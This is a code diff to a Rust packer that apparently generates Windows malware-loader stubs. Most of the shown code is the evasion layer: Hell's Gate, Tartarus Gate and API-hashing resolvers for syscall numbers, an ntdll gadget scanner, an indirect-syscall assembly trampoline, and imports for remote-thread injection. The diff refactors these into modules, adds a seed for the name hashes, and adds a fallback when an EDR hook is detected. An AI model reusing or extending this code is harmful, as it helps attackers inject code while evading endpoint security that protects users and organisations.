@@ -31,6 +31,10 @@ use crate::techniques::{stack_spoofing, RuntimeStep};
 
 use super::obfuscation::StringsConfig;
 
+mod pe_file;
+mod prelude;
+pub mod resolvers;
+
 /// Raw `build.stub.syscalls` YAML block, before semantic validation.
 ///
 /// `mode` and `resolver` are kept as plain strings here so that
@@ -1343,23 +1347,6 @@ fn required_functions_with(
         .collect()
 }
 
-/// FNV-1a 64-bit hash of a function name.
-///
-/// The API-hashing resolver embeds these hashes as numeric constants instead of
-/// the (obfuscated) Nt* names, so it needs neither `GetProcAddress` nor a name
-/// string. Mirrors the `api_hash` function emitted into the generated stub —
-/// keep the two in sync.
-fn api_hash(name: &[u8]) -> u64 {
-    const OFFSET_BASIS: u64 = 0xcbf2_9ce4_8422_2325;
-    const PRIME: u64 = 0x0000_0100_0000_01b3;
-    let mut hash = OFFSET_BASIS;
-    for &byte in name {
-        hash ^= byte as u64;
-        hash = hash.wrapping_mul(PRIME);
-    }
-    hash
-}
-
 /// Renders the `$SYSCALLS_BLOCK$` fragment for the given runtime.
 ///
 /// - No active technique needs syscalls: a no-op `init_syscalls`.
@@ -1375,12 +1362,13 @@ pub fn render_block_with(
     pipeline: &[RuntimeStep],
     strings: &StringsConfig,
     extra_nt: &[&'static str],
+    seed: u64,
 ) -> String {
     let required = required_functions_with(pipeline, extra_nt);
     if required.is_empty() {
         return assemble(
             "// --- Syscall layer ---\n// No active technique uses NT syscalls, so the layer is a no-op.",
-            EMPTY_BODY,
+            prelude::EMPTY_BODY,
             &["init_syscalls"],
         );
     }
@@ -1403,7 +1391,7 @@ pub fn render_block_with(
                      the binary: Hell's/Tartarus Gate rebuild them at runtime from\n// obfuscated bytes, \
                      api_hash replaces them with precomputed FNV-1a hashes.\n// See docs/techniques/indirect_syscalls.md."
                 ),
-                render_indirect(plan, &required, strings, spoofing_block(pipeline, strings)),
+                render_indirect(plan, &required, strings, spoofing_block(pipeline, strings), seed),
             )
         }
     };
@@ -1421,528 +1409,6 @@ fn assemble(header: &str, body: &str, reexports: &[&str]) -> String {
     block.push_str(&format!("use syscalls::{{{}}};\n", reexports.join(", ")));
     block
 }
-
-/// The block when no technique in the pipeline needs syscalls.
-const EMPTY_BODY: &str = r#"    /// Initializes the syscall layer. A no-op here: no technique needs it.
-    pub fn init_syscalls() -> Result<(), String> {
-        Ok(())
-    }
-"#;
-
-/// Prelude shared by every `mode: none` block (imports + no-op init).
-const NONE_PRELUDE: &str = r#"    use windows::core::PCSTR;
-    use windows::Win32::Foundation::{CloseHandle, GetLastError, HANDLE};
-    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
-    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-    use windows::Win32::System::Memory::{
-        VirtualAllocEx, VirtualProtectEx, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
-    };
-    use windows::Win32::System::Threading::{
-        CreateRemoteThread, QueueUserAPC, ResumeThread, SuspendThread, WaitForSingleObject,
-    };
-
-    const STATUS_SUCCESS: i32 = 0;
-    /// Generic failure for a mapped Win32 call that has no real NTSTATUS.
-    const STATUS_UNSUCCESSFUL: i32 = 0xC000_0001u32 as i32;
-    /// Invalid parameter (a null thread start routine, for instance).
-    const STATUS_INVALID_PARAMETER: i32 = 0xC000_000Du32 as i32;
-
-    /// Initializes the syscall layer. A no-op when syscalls are disabled.
-    pub fn init_syscalls() -> Result<(), String> {
-        crate::tech_dbg!("syscalls", "mode none: the nt_* helpers call the Win32 APIs directly");
-        Ok(())
-    }
-
-    /// Resolves an ntdll export by name and returns its address (0 on failure).
-    /// Used by the none-mode helpers for the Nt* functions windows-rs does not
-    /// declare. The DLL/function names are reconstructed at runtime from the
-    /// obfuscated bytes the packer injects.
-    fn resolve_nt_export(name: &str) -> usize {
-        let Ok(ntdll) = std::ffi::CString::new($NTDLL_DEF$) else {
-            return 0;
-        };
-        let Ok(fn_name) = std::ffi::CString::new(name) else {
-            return 0;
-        };
-        let Ok(module) = (unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }) else {
-            return 0;
-        };
-        let Some(address) =
-            (unsafe { GetProcAddress(module, PCSTR(fn_name.as_ptr() as *const u8)) })
-        else {
-            return 0;
-        };
-        address as usize
-    }
-"#;
-
-/// Prelude of the `mode: indirect` block: trampoline, SSN table, gadget
-/// scanner and the resolver body placeholder. `$SSN_FIELDS$` / `$SSN_INIT$` /
-/// `$RESOLVER_BODY$` are filled by [`render_indirect`].
-const INDIRECT_PRELUDE: &str = r#"    use core::arch::global_asm;
-    use std::sync::OnceLock;
-
-    use windows::core::PCSTR;
-    use windows::Win32::Foundation::{HANDLE, HMODULE};
-    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-
-    const STATUS_SUCCESS: i32 = 0;
-    /// Generic failure when the layer was not initialized before a call.
-    const STATUS_UNSUCCESSFUL: i32 = 0xC000_0001u32 as i32;
-
-    /// Invokes one NT syscall through the `syscall; ret` gadget in ntdll.
-    ///
-    /// Windows x64 ABI: arguments 1-4 arrive in rcx/rdx/r8/r9 and every further
-    /// argument on the caller's stack, at [rsp+40], [rsp+48], ... (the callee
-    /// sees argument 5 at [rsp+40]: 8 bytes of return address plus the 32-byte
-    /// shadow space). `syscall` does not push a return address, so the kernel
-    /// reads arguments 5+ from exactly those slots — the caller has already
-    /// placed them where the kernel expects them, and the trampoline must not
-    /// touch them.
-    ///
-    /// It only sets the three registers `syscall` needs: r10 = argument 1, eax
-    /// = SSN, and r11 = the gadget address (the `syscall; ret` sequence). The
-    /// gadget's trailing `ret` pops the caller's return address and goes
-    /// straight back to the Rust caller.
-    ///
-    /// The signature is fixed at eleven argument slots (`NtCreateThreadEx` is
-    /// the widest call a technique needs; the SSN/gadget pair follows them), so
-    /// callers pass unused slots as `0`. The two trailing parameters land after
-    /// every syscall argument, which is why they never reach the kernel.
-    extern "system" {
-        fn $TRAMPOLINE_NAME$(
-            arg1: usize,
-            arg2: usize,
-            arg3: usize,
-            arg4: usize,
-            arg5: usize,
-            arg6: usize,
-            arg7: usize,
-            arg8: usize,
-            arg9: usize,
-            arg10: usize,
-            arg11: usize,
-            ssn: u32,
-            gadget: usize,
-        ) -> i32;
-    }
-
-    global_asm!(
-        ".intel_syntax noprefix",
-        ".global $TRAMPOLINE_NAME$",
-        "$TRAMPOLINE_NAME$:",
-        "mov r10, rcx",         // r10 = arg1 (syscall argument convention)
-        "mov eax, [rsp + 96]",  // eax = SSN (arg12)
-        "mov r11, [rsp + 104]", // r11 = gadget address (syscall; ret, arg13)
-        "jmp r11",
-    );
-
-    /// SSNs resolved at startup. The packer emits exactly the fields the
-    /// active techniques need.
-    struct SsnTable {
-$SSN_FIELDS$
-    }
-
-    static SSNS: OnceLock<SsnTable> = OnceLock::new();
-    /// Address of the first `syscall; ret` gadget in ntdll's `.text`.
-    static GADGET: OnceLock<usize> = OnceLock::new();
-
-    /// Why the syscall layer failed to initialize.
-    #[derive(Debug, thiserror::Error)]
-    enum SyscallError {
-        #[error("could not load the native API library")]
-        NtdllNotFound,
-        #[error("could not resolve '{0}'")]
-        FunctionNotFound(String),
-        #[error("the SSN could not be read from '{0}': the ntdll stub prologue is hooked (switch resolver to tartarus_gate)")]
-        PatternMismatch(String),
-        #[error("could not locate a syscall; ret gadget in ntdll")]
-        GadgetNotFound,
-        /// Reserved for helpers that wrap the NTSTATUS (later phases).
-        #[error("syscall invocation failed (0x{0:08x})")]
-        #[allow(dead_code)]
-        InvocationFailed(i32),
-    }
-
-    /// Resolves every SSN the active techniques need and caches the gadget.
-    /// The stub calls this once, before the techniques run.
-    pub fn init_syscalls() -> Result<(), String> {
-        let (table, gadget) = resolve_ssns().map_err(|e| {
-            crate::tech_dbg!("syscalls", "initialization failed: {e}");
-            e.to_string()
-        })?;
-        let _ = SSNS.set(table);
-        let _ = GADGET.set(gadget);
-$SPOOFING_INIT$
-        crate::tech_dbg!("syscalls", "ssn table resolved, gadget at 0x{gadget:x}");
-        Ok(())
-    }
-
-    /// Returns the SSN when `bytes` starts with the canonical prologue
-    /// `4C 8B D1 B8 ?? ?? ?? ??` (`mov r10, rcx; mov eax, <SSN>`).
-    /// Mirrors `engine::syscalls::parse_ssn_prologue` (unit-tested in the
-    /// packer).
-    fn parse_ssn(bytes: &[u8]) -> Option<u32> {
-        let prologue = [0x4C, 0x8B, 0xD1, 0xB8];
-        if bytes.len() < 8 || bytes[..4] != prologue {
-            return None;
-        }
-        Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]))
-    }
-
-    /// Scans ntdll's `.text` section for the first `0F 05 C3` (syscall; ret).
-    /// Mirrors `engine::syscalls::find_gadget_offset` (unit-tested in the
-    /// packer).
-    fn find_gadget(module: HMODULE) -> Result<usize, SyscallError> {
-        let base = module.0 as usize;
-        // ntdll is mapped at its preferred base, so RVAs are offsets from
-        // `base`: walk the PE section table to find `.text` and scan it.
-        let text = text_range(base).ok_or(SyscallError::GadgetNotFound)?;
-        let bytes = unsafe { std::slice::from_raw_parts(text.0 as *const u8, text.1) };
-        for (i, window) in bytes.windows(3).enumerate() {
-            if window == [0x0F, 0x05, 0xC3] {
-                return Ok(text.0 + i);
-            }
-        }
-        Err(SyscallError::GadgetNotFound)
-    }
-
-    /// Returns the in-memory `[start, size)` of ntdll's `.text` section.
-    fn text_range(base: usize) -> Option<(usize, usize)> {
-        let dos = base as *const u8;
-        if unsafe { *dos } != b'M' || unsafe { *dos.add(1) } != b'Z' {
-            return None;
-        }
-        let e_lfanew = pe_u32(base, 0x3C)? as usize;
-        // IMAGE_NT_HEADERS: Signature (4) + FileHeader (20) + OptionalHeader.
-        // FileHeader.NumberOfSections is at offset 2, SizeOfOptionalHeader at
-        // offset 16; the section table follows the optional header.
-        let num_sections = pe_u16(base, e_lfanew.checked_add(4 + 2)?)? as usize;
-        let opt_size = pe_u16(base, e_lfanew.checked_add(4 + 16)?)? as usize;
-        let table = e_lfanew.checked_add(4 + 20)?.checked_add(opt_size as usize)?;
-        for i in 0..num_sections {
-            let s = table.checked_add(i * 40)?;
-            let name = unsafe { std::slice::from_raw_parts((base + s) as *const u8, 8) };
-            if &name[..5] == b".text" {
-                let virtual_address = pe_u32(base, s + 12)? as usize;
-                let virtual_size = pe_u32(base, s + 8)? as usize;
-                let raw_size = pe_u32(base, s + 16)? as usize;
-                return Some((base + virtual_address, virtual_size.max(raw_size)));
-            }
-        }
-        None
-    }
-
-    /// Bounds-checked little-endian u16 read from ntdll's mapped image.
-    fn pe_u16(base: usize, off: usize) -> Option<u16> {
-        let p = base.checked_add(off)?;
-        let s = unsafe { std::slice::from_raw_parts(p as *const u8, 2) };
-        Some(u16::from_le_bytes([s[0], s[1]]))
-    }
-
-    /// Bounds-checked little-endian u32 read from ntdll's mapped image.
-    fn pe_u32(base: usize, off: usize) -> Option<u32> {
-        let p = base.checked_add(off)?;
-        let s = unsafe { std::slice::from_raw_parts(p as *const u8, 4) };
-        Some(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
-    }
-
-$RESOLVER_BODY$
-"#;
-
-/// Hell's Gate resolver: reads SSNs out of the live ntdll export stubs.
-/// `$SSN_INIT$` / `$SSN_RESOLVE$` / `$NTDLL_DEF$` are filled by
-/// [`render_indirect`].
-const HELLS_GATE_RESOLVER: &str = r#"    /// Hell's Gate: reads each SSN out of the Nt* stub prologue in ntdll.
-    fn resolve_ssns() -> Result<(SsnTable, usize), SyscallError> {
-        let ntdll =
-            std::ffi::CString::new($NTDLL_DEF$).map_err(|_| SyscallError::NtdllNotFound)?;
-        let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
-            .map_err(|_| SyscallError::NtdllNotFound)?;
-
-        let mut table = SsnTable {
-$SSN_INIT$
-        };
-$SSN_RESOLVE$
-
-        let gadget = find_gadget(module)?;
-        Ok((table, gadget))
-    }
-
-    /// Resolves one function and reads its SSN from the stub prologue.
-    fn resolve_ssn(module: HMODULE, name: &str) -> Result<u32, SyscallError> {
-        let cname = std::ffi::CString::new(name)
-            .map_err(|_| SyscallError::FunctionNotFound(name.to_string()))?;
-        let address = unsafe { GetProcAddress(module, PCSTR(cname.as_ptr() as *const u8)) };
-        let Some(address) = address else {
-            return Err(SyscallError::FunctionNotFound(name.to_string()));
-        };
-        let prologue = unsafe { std::slice::from_raw_parts(address as *const u8, 8) };
-        match parse_ssn(prologue) {
-            Some(ssn) => {
-                crate::tech_dbg!("syscalls", "hells_gate: {name} -> SSN {ssn}");
-                Ok(ssn)
-            }
-            None => {
-                crate::tech_dbg!(
-                    "syscalls",
-                    "hells_gate: {name} has a hooked prologue (pattern mismatch)"
-                );
-                Err(SyscallError::PatternMismatch(name.to_string()))
-            }
-        }
-    }
-"#;
-
-/// PE-file walk helpers shared by the disk-reading resolvers (Tartarus Gate and
-/// API hashing): RVA→file-offset conversion and bounds-checked u16/u32 reads.
-/// Injected into the resolver body through `$FILE_PE_HELPERS$`.
-const FILE_PE_HELPERS: &str = r#"    /// Converts a PE RVA to a file offset using the section table.
-    fn rva_to_offset(file: &[u8], rva: usize) -> Option<usize> {
-        let e_lfanew = pe32_at(file, 0x3C)? as usize;
-        if pe32_at(file, e_lfanew)? != 0x0000_4550 {
-            return None;
-        }
-        let num_sections = pe16_at(file, e_lfanew + 4 + 2)? as usize;
-        let opt_size = pe16_at(file, e_lfanew + 4 + 16)? as usize;
-        let table = e_lfanew + 4 + 20 + opt_size as usize;
-
-        let mut first_va: Option<usize> = None;
-        for i in 0..num_sections {
-            let s = table + i * 40;
-            let va = pe32_at(file, s + 12)? as usize;
-            let raw_size = pe32_at(file, s + 16)? as usize;
-            let raw = pe32_at(file, s + 20)? as usize;
-            first_va = Some(first_va.map_or(va, |f| f.min(va)));
-            if rva >= va && rva - va < raw_size {
-                return Some(raw + (rva - va));
-            }
-        }
-        // RVAs below the first section live in the headers, which map 1:1.
-        match first_va {
-            Some(first) if rva < first => Some(rva),
-            _ => None,
-        }
-    }
-
-    /// Bounds-checked little-endian u16 read from the clean file image.
-    fn pe16_at(file: &[u8], off: usize) -> Option<u16> {
-        let s = file.get(off..off.checked_add(2)?)?;
-        Some(u16::from_le_bytes([s[0], s[1]]))
-    }
-
-    /// Bounds-checked little-endian u32 read from the clean file image.
-    fn pe32_at(file: &[u8], off: usize) -> Option<u32> {
-        let s = file.get(off..off.checked_add(4)?)?;
-        Some(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
-    }
-"#;
-
-/// Tartarus Gate resolver: reads SSNs from a clean copy of ntdll read from
-/// disk. `$SSN_INIT$` / `$SSN_RESOLVE$` / `$NTDLL_DEF$` / `$NTDLL_PATH_DEF$` /
-/// `$FILE_PE_HELPERS$` are filled by [`render_indirect`].
-const TARTARUS_GATE_RESOLVER: &str = r#"    /// Tartarus Gate: reads each SSN from a clean copy of ntdll read from
-    /// disk, so EDR hooks in the live export stubs cannot hide the SSN. The
-    /// gadget still comes from the live ntdll (its `.text` is not hooked).
-    fn resolve_ssns() -> Result<(SsnTable, usize), SyscallError> {
-        let path = $NTDLL_PATH_DEF$;
-        let file = std::fs::read(path).map_err(|_| SyscallError::NtdllNotFound)?;
-
-        let mut table = SsnTable {
-$SSN_INIT$
-        };
-$SSN_RESOLVE$
-
-        let ntdll =
-            std::ffi::CString::new($NTDLL_DEF$).map_err(|_| SyscallError::NtdllNotFound)?;
-        let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
-            .map_err(|_| SyscallError::NtdllNotFound)?;
-        let gadget = find_gadget(module)?;
-        Ok((table, gadget))
-    }
-
-    /// Resolves one function and reads its SSN from the clean file image.
-    fn resolve_ssn(file: &[u8], name: &str) -> Result<u32, SyscallError> {
-        let rva = export_rva(file, name)
-            .ok_or_else(|| SyscallError::FunctionNotFound(name.to_string()))?;
-        let offset = rva_to_offset(file, rva as usize)
-            .ok_or_else(|| SyscallError::FunctionNotFound(name.to_string()))?;
-        let Some(end) = offset.checked_add(8) else {
-            return Err(SyscallError::FunctionNotFound(name.to_string()));
-        };
-        let prologue = file
-            .get(offset..end)
-            .ok_or_else(|| SyscallError::FunctionNotFound(name.to_string()))?;
-        match parse_ssn(prologue) {
-            Some(ssn) => {
-                crate::tech_dbg!("syscalls", "tartarus_gate: {name} -> SSN {ssn}");
-                Ok(ssn)
-            }
-            None => {
-                crate::tech_dbg!(
-                    "syscalls",
-                    "tartarus_gate: {name} has a hooked prologue (pattern mismatch)"
-                );
-                Err(SyscallError::PatternMismatch(name.to_string()))
-            }
-        }
-    }
-
-    /// Finds a function's RVA in a PE image's export directory. `file` is the
-    /// raw bytes of the (clean) ntdll file. Safe slice reads throughout.
-    fn export_rva(file: &[u8], name: &str) -> Option<u32> {
-        let e_lfanew = pe32_at(file, 0x3C)? as usize;
-        if pe32_at(file, e_lfanew)? != 0x0000_4550 {
-            return None;
-        }
-        let opt = e_lfanew + 4 + 20;
-        let magic = pe16_at(file, opt)?;
-        // The data directory starts at optional-header offset 112 (PE32+) or
-        // 96 (PE32); ntdll on x64 is PE32+.
-        let dir_off = if magic == 0x20b { opt + 112 } else { opt + 96 };
-        let export_va = pe32_at(file, dir_off)? as usize;
-        if export_va == 0 {
-            return None;
-        }
-        let ed = rva_to_offset(file, export_va)?;
-        let num_names = pe32_at(file, ed + 24)? as usize;
-        let addr_functions = pe32_at(file, ed + 28)? as usize;
-        let addr_names = pe32_at(file, ed + 32)? as usize;
-        let addr_ordinals = pe32_at(file, ed + 36)? as usize;
-
-        for i in 0..num_names {
-            let name_rva =
-                pe32_at(file, rva_to_offset(file, addr_names.checked_add(i.checked_mul(4)?)?)?)?
-                    as usize;
-            let name_off = rva_to_offset(file, name_rva)?;
-            let rest = file.get(name_off..)?;
-            let end = rest.iter().position(|&b| b == 0).unwrap_or(rest.len());
-            if &rest[..end] == name.as_bytes() {
-                let ordinal = pe16_at(
-                    file,
-                    rva_to_offset(file, addr_ordinals.checked_add(i.checked_mul(2)?)?)?,
-                )? as usize;
-                return pe32_at(
-                    file,
-                    rva_to_offset(file, addr_functions.checked_add(ordinal.checked_mul(4)?)?)?,
-                );
-            }
-        }
-        None
-    }
-
-$FILE_PE_HELPERS$
-"#;
-
-/// API-hashing resolver: walks a clean copy of ntdll read from disk and matches
-/// each required function by a precomputed FNV-1a hash of its name, so neither
-/// `GetProcAddress` nor any function-name string is needed. The SSN is read
-/// from the clean prologue; the gadget still comes from the live ntdll.
-/// `$SSN_INIT$` / `$SSN_RESOLVE$` / `$NTDLL_DEF$` / `$NTDLL_PATH_DEF$` /
-/// `$FILE_PE_HELPERS$` are filled by [`render_indirect`].
-const API_HASH_RESOLVER: &str = r#"    /// API hashing: resolves each SSN by a precomputed FNV-1a hash of its
-    /// name, walking a clean copy of ntdll read from disk. No GetProcAddress
-    /// and no function-name strings are involved.
-    fn resolve_ssns() -> Result<(SsnTable, usize), SyscallError> {
-        let path = $NTDLL_PATH_DEF$;
-        let file = std::fs::read(path).map_err(|_| SyscallError::NtdllNotFound)?;
-
-        let mut table = SsnTable {
-$SSN_INIT$
-        };
-$SSN_RESOLVE$
-
-        let ntdll =
-            std::ffi::CString::new($NTDLL_DEF$).map_err(|_| SyscallError::NtdllNotFound)?;
-        let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
-            .map_err(|_| SyscallError::NtdllNotFound)?;
-        let gadget = find_gadget(module)?;
-        Ok((table, gadget))
-    }
-
-    /// FNV-1a 64-bit hash of a function name. Mirrors the packer's `api_hash`
-    /// (`engine::syscalls`); keep the two in sync.
-    fn api_hash(name: &[u8]) -> u64 {
-        let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
-        for &byte in name {
-            hash ^= byte as u64;
-            hash = hash.wrapping_mul(0x0000_0100_0000_01b3);
-        }
-        hash
-    }
-
-    /// Resolves one function by hash and reads its SSN from the clean file.
-    fn resolve_ssn(file: &[u8], hash: u64) -> Result<u32, SyscallError> {
-        let rva = export_rva_by_hash(file, hash)
-            .ok_or_else(|| SyscallError::FunctionNotFound(format!("0x{hash:016x}")))?;
-        let offset = rva_to_offset(file, rva as usize)
-            .ok_or_else(|| SyscallError::FunctionNotFound(format!("0x{hash:016x}")))?;
-        let Some(end) = offset.checked_add(8) else {
-            return Err(SyscallError::FunctionNotFound(format!("0x{hash:016x}")));
-        };
-        let prologue = file
-            .get(offset..end)
-            .ok_or_else(|| SyscallError::FunctionNotFound(format!("0x{hash:016x}")))?;
-        match parse_ssn(prologue) {
-            Some(ssn) => {
-                crate::tech_dbg!("syscalls", "api_hash: 0x{hash:016x} -> SSN {ssn}");
-                Ok(ssn)
-            }
-            None => {
-                crate::tech_dbg!(
-                    "syscalls",
-                    "api_hash: 0x{hash:016x} has a hooked prologue (pattern mismatch)"
-                );
-                Err(SyscallError::PatternMismatch(format!("0x{hash:016x}")))
-            }
-        }
-    }
-
-    /// Finds a function's RVA by matching its hashed export name against
-    /// `hash`. `file` is the raw bytes of the (clean) ntdll file.
-    fn export_rva_by_hash(file: &[u8], hash: u64) -> Option<u32> {
-        let e_lfanew = pe32_at(file, 0x3C)? as usize;
-        if pe32_at(file, e_lfanew)? != 0x0000_4550 {
-            return None;
-        }
-        let opt = e_lfanew + 4 + 20;
-        let magic = pe16_at(file, opt)?;
-        // The data directory starts at optional-header offset 112 (PE32+) or
-        // 96 (PE32); ntdll on x64 is PE32+.
-        let dir_off = if magic == 0x20b { opt + 112 } else { opt + 96 };
-        let export_va = pe32_at(file, dir_off)? as usize;
-        if export_va == 0 {
-            return None;
-        }
-        let ed = rva_to_offset(file, export_va)?;
-        let num_names = pe32_at(file, ed + 24)? as usize;
-        let addr_functions = pe32_at(file, ed + 28)? as usize;
-        let addr_names = pe32_at(file, ed + 32)? as usize;
-        let addr_ordinals = pe32_at(file, ed + 36)? as usize;
-
-        for i in 0..num_names {
-            let name_rva =
-                pe32_at(file, rva_to_offset(file, addr_names.checked_add(i.checked_mul(4)?)?)?)?
-                    as usize;
-            let name_off = rva_to_offset(file, name_rva)?;
-            let rest = file.get(name_off..)?;
-            let end = rest.iter().position(|&b| b == 0).unwrap_or(rest.len());
-            if api_hash(&rest[..end]) == hash {
-                let ordinal = pe16_at(
-                    file,
-                    rva_to_offset(file, addr_ordinals.checked_add(i.checked_mul(2)?)?)?,
-                )? as usize;
-                return pe32_at(
-                    file,
-                    rva_to_offset(file, addr_functions.checked_add(ordinal.checked_mul(4)?)?)?,
-                );
-            }
-        }
-        None
-    }
-
-$FILE_PE_HELPERS$
-"#;
 
 /// Renders the `mode: none` body: the prelude plus the direct helpers for the
 /// required functions.
@@ -1972,7 +1438,7 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
         .obfuscate("NtSetInformationFile")
         .render_stub_expr("set_info_file_name");
 
-    let mut out = String::from(NONE_PRELUDE);
+    let mut out = String::from(prelude::NONE_PRELUDE);
     for f in required {
         out.push_str(f.helper_none);
         out.push('\n');
@@ -1995,6 +1461,7 @@ fn render_indirect(
     required: &[&'static NtFunction],
     strings: &StringsConfig,
     spoofing: Option<String>,
+    seed: u64,
 ) -> String {
     let ntdll_def = strings
         .obfuscate("ntdll.dll")
@@ -2017,7 +1484,7 @@ fn render_indirect(
         let name_var = format!("{}_name", f.table_field);
         let name_def = strings.obfuscate(f.name).render_stub_expr(&name_var);
         resolve_hg.push_str(&format!(
-            "        table.{} = resolve_ssn(module, &{})?;\n",
+            "        table.{} = resolve_ssn_with_fallback(module, &{})?;\n",
             f.table_field, name_def
         ));
         resolve_tg.push_str(&format!(
@@ -2027,7 +1494,7 @@ fn render_indirect(
         resolve_ah.push_str(&format!(
             "        table.{} = resolve_ssn(&file, 0x{:016x})?;\n",
             f.table_field,
-            api_hash(f.name.as_bytes())
+            resolvers::api_hash::api_hash_with(f.name.as_bytes(), seed)
         ));
 
         helpers.push_str(f.helper_indirect);
@@ -2046,36 +1513,20 @@ fn render_indirect(
         None => false,
     };
 
-    let resolver_body = match plan.resolver {
-        Resolver::HellsGate => HELLS_GATE_RESOLVER
-            .replace("$SSN_INIT$", init.trim_end())
-            .replace("$SSN_RESOLVE$", resolve_hg.trim_end())
-            .replace("$NTDLL_DEF$", &ntdll_def),
-        Resolver::TartarusGate => {
-            let ntdll_path = strings
-                .obfuscate(r"C:\Windows\System32\ntdll.dll")
-                .render_stub_expr("ntdll_path");
-            TARTARUS_GATE_RESOLVER
-                .replace("$SSN_INIT$", init.trim_end())
-                .replace("$SSN_RESOLVE$", resolve_tg.trim_end())
-                .replace("$NTDLL_DEF$", &ntdll_def)
-                .replace("$NTDLL_PATH_DEF$", &ntdll_path)
-                .replace("$FILE_PE_HELPERS$", FILE_PE_HELPERS)
-        }
-        Resolver::ApiHash => {
-            let ntdll_path = strings
-                .obfuscate(r"C:\Windows\System32\ntdll.dll")
-                .render_stub_expr("ntdll_path");
-            API_HASH_RESOLVER
-                .replace("$SSN_INIT$", init.trim_end())
-                .replace("$SSN_RESOLVE$", resolve_ah.trim_end())
-                .replace("$NTDLL_DEF$", &ntdll_def)
-                .replace("$NTDLL_PATH_DEF$", &ntdll_path)
-                .replace("$FILE_PE_HELPERS$", FILE_PE_HELPERS)
-        }
+    let resolve = match plan.resolver {
+        Resolver::HellsGate => &resolve_hg,
+        Resolver::TartarusGate => &resolve_tg,
+        Resolver::ApiHash => &resolve_ah,
     };
+    let resolver_body = resolvers::render_body(
+        plan.resolver,
+        init.trim_end(),
+        resolve.trim_end(),
+        &ntdll_def,
+        seed,
+    );
 
-    let mut out = INDIRECT_PRELUDE
+    let mut out = prelude::INDIRECT_PRELUDE
         .replace("$SSN_FIELDS$", fields.trim_end())
         .replace("$RESOLVER_BODY$", &resolver_body)
         .replace(
@@ -2128,13 +1579,15 @@ pub fn parse_ssn_prologue(bytes: &[u8]) -> Option<u32> {
     Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]))
 }
 
-/// Returns the offset of the first `0F 05 C3` (`syscall; ret`) gadget in
-/// `bytes`, if any. Mirrors the generated stub's ntdll `.text` scanner, so
-/// the gadget-matching behavior is unit-tested here.
+/// Returns the offset of the first `syscall` followed by a return (`0F 05 C3`
+/// or `0F 05 CB`) in `bytes`, if any. Mirrors the generated stub's gadget
+/// scanner (`prelude::INDIRECT_PRELUDE`), so the matching behavior is
+/// unit-tested here instead of on a live ntdll.
 #[cfg(test)]
 pub fn find_gadget_offset(bytes: &[u8]) -> Option<usize> {
-    const GADGET: [u8; 3] = [0x0F, 0x05, 0xC3]; // syscall; ret
-    bytes.windows(3).position(|window| window == GADGET)
+    bytes
+        .windows(3)
+        .position(|w| w[0] == 0x0F && w[1] == 0x05 && (w[2] == 0xC3 || w[2] == 0xCB))
 }
 
 #[cfg(test)]
@@ -2143,6 +1596,10 @@ mod tests {
     use crate::engine::obfuscation::{StringStrategy, StringsConfig};
     use crate::techniques::process_hollowing::Params;
     use crate::techniques::TechniqueKind;
+
+    /// The standard FNV basis, used as the test seed so the API-hashing hash
+    /// constants match the pinned reference values.
+    const TEST_SEED: u64 = 0xcbf2_9ce4_8422_2325;
 
     fn xor_config() -> StringsConfig {
         StringsConfig {
@@ -2342,6 +1799,44 @@ mod tests {
         assert_eq!(ssn, 7);
     }
 
+    /// Host-side mirror of the stub's `resolve_ssn_with_fallback` decision:
+    /// only a hooked live prologue falls back to the clean on-disk copy.
+    fn resolve_ssn_with_fallback_reference(
+        live: &dyn Fn(&str) -> std::result::Result<u32, ReferenceError>,
+        file: &dyn Fn(&str) -> std::result::Result<u32, ReferenceError>,
+        name: &str,
+    ) -> std::result::Result<u32, ReferenceError> {
+        match live(name) {
+            Ok(ssn) => Ok(ssn),
+            Err(ReferenceError::PatternMismatch(_)) => file(name),
+            Err(other) => Err(other),
+        }
+    }
+
+    #[test]
+    fn hells_gate_falls_back_to_the_file_on_a_hooked_prologue() {
+        let hooked = |_name: &str| Err(ReferenceError::PatternMismatch("NtX".into()));
+        let clean = |_name: &str| Ok(9);
+        assert_eq!(
+            resolve_ssn_with_fallback_reference(&hooked, &clean, "NtX"),
+            Ok(9)
+        );
+
+        // A missing live export is not a hook, so it does not fall back.
+        let missing = |_name: &str| Err(ReferenceError::FunctionNotFound("NtX".into()));
+        assert!(matches!(
+            resolve_ssn_with_fallback_reference(&missing, &clean, "NtX"),
+            Err(ReferenceError::FunctionNotFound(_))
+        ));
+
+        // A live success is never overridden by the file.
+        let live = |_name: &str| Ok(11);
+        assert_eq!(
+            resolve_ssn_with_fallback_reference(&live, &clean, "NtX"),
+            Ok(11)
+        );
+    }
+
     /// Reference error type for [`resolve_ssn_reference`], mirroring the
     /// stub's `SyscallError::FunctionNotFound` / `PatternMismatch` variants.
     #[derive(Debug, PartialEq, Eq)]
@@ -2370,23 +1865,61 @@ mod tests {
 
     #[test]
     fn api_hash_matches_fnv1a_reference_values() {
-        // FNV-1a 64-bit; the empty string returns the offset basis untouched,
-        // and the first required NT function is pinned against an independent
-        // reference computed outside the crate.
-        assert_eq!(api_hash(b""), 0xcbf2_9ce4_8422_2325);
-        assert_eq!(api_hash(b"NtAllocateVirtualMemory"), 0x4fe2_32be_2dca_3638);
-        assert_eq!(api_hash(b"NtGetContextThread"), 0x60b6_1d0a_f197_a950);
+        // FNV-1a 64-bit with the canonical basis; the empty string returns the
+        // basis untouched, and the first required NT function is pinned against
+        // an independent reference computed outside the crate.
+        let h = |name: &[u8]| {
+            resolvers::api_hash::api_hash_with(name, resolvers::api_hash::OFFSET_BASIS)
+        };
+        assert_eq!(h(b""), 0xcbf2_9ce4_8422_2325);
